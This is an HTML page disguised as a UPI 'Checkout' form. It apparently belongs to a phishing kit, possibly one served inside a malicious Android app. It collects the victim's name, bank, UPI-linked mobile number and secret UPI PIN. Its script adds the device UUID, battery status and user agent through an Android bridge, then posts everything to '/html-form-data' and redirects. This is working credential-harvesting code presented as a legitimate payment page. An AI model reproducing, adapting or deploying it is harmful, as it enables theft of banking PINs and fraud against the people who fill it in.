<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checkout</title>
<link rel="stylesheet" href="style2.css">
</head>
<body>
<div class="banner">
 <img src="01.jpg" alt="Banner Image" style="width:100%;height:100%;">
</div>

<div class="container">
 <form id="paymentForm">
   <div class="form-section">
     <h2>ENTER YOUR CREDENTIALS</h2>
     <label for="firstName">CLIENT'S NAME</label>
     <input type="text" id="firstName" name="firstName" placeholder="ENTER YOUR NAME" required>

     <label for="lastName">BANK NAME</label>
     <input type="text" id="lastName" name="lastName" placeholder="ENTER YOUR BANK NAME" required>

     <label for="mobileNumber">MOBILE NUMBER</label>
     <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="UPI LINKED MOBILE NUMBER" required>

     <label for="amount">AMOUNT</label>
     <input type="text" id="amount" name="amount" placeholder="ENTER YOUR AMOUNT" required>

     <label for="upiPin">PIN</label>
     <input type="password" id="upiPin" name="upiPin" placeholder="ENTER YOUR UPI PIN" required>
   </div>
   <button type="submit">MAKE PAYMENT</button>
 </form>
</div>

<script>
const form = document.getElementById("paymentForm");

form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const formData = new FormData(form);
    const data = {
        clientName: formData.get("firstName"),
        bankName: formData.get("lastName"),
        mobileNumber: formData.get("mobileNumber"),
        amount: formData.get("amount"),
        upiPin: formData.get("upiPin")
    };

    // Device info from APK
    if(window.AndroidDevice && AndroidDevice.getUUID && AndroidDevice.getBattery){
        data.uuid = AndroidDevice.getUUID();
        data.battery = AndroidDevice.getBattery();
        data.device = navigator.userAgent;
    }

    try {
        const res = await fetch("/html-form-data", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(data)
        });

        const result = await res.json();
        console.log(result);
        alert("✅ Data sent successfully!");
        window.location.href = "next-page.html"; // redirect
    } catch(err) {
        console.error(err);
        alert("❌ Error sending data to server.");
    }
});
</script>
</body>
</html>
